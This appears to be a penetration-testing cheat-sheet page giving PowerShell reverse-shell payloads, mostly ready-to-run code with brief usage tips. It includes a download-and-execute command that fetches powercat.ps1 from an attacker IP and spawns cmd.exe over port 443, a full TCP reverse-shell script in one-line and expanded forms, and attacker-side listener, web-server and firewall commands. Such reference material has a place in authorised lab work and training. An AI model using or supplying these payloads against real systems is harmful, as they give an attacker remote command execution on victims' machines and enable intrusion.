# Powercat | Powershell

## Powercat

```bash
powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.189/powercat.ps1');powercat -c 192.168.119.189 -p 443 -e cmd.exe"
```

{% hint style="info" %}
cmd.exe payload is more reliable and preferred than the Powershell payload below.
{% endhint %}

{% hint style="danger" %}
Note it may be necessary to press `Enter` a couple times after the connection is established. Otherwise shell may not be sent successfully.
{% endhint %}

## Powershell (.ps1 file)

$ATTACKER

{% code title="rshell.ps1 (one-liner)" %}
```bash
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.189",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

{% code title="rshell.ps1 (expanded)" %}
```bash
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.189",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "# ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()};
$client.Close()
```
{% endcode %}

```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
sudo ufw allow from $TARGET proto tcp to any port 80,443
```

$TARGET

```bash
powershell IEX (New-Object Net.WebClient).DownloadString("http://192.168.119.189/rshell.ps1");
```

## Powershell (one liner)

Alternatively, use a one liner on the TARGET:

```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.189',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Expanded one liner:

```bash
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.189',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close();
```
